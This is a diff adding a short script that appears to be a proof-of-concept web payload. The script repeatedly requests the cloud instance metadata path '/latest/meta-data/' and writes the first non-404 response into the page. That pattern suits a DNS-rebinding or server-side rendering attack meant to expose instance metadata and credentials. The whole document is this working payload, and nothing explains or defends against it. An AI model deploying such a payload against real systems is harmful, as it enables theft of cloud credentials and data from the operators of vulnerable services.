@@ -1,0 +1,14 @@
+<script>
+var i=0;
+// 10000 requests is plenty, make sure we don't DoS
+while (i < 10000){
+	var x = new XMLHttpRequest(); 
+	x.open("GET", "/latest/meta-data/", false); 
+	x.send();
+	if (x.status != 404){
+		document.write(x.responseText);
+		break
+	}
+	i++;
+}
+</script>
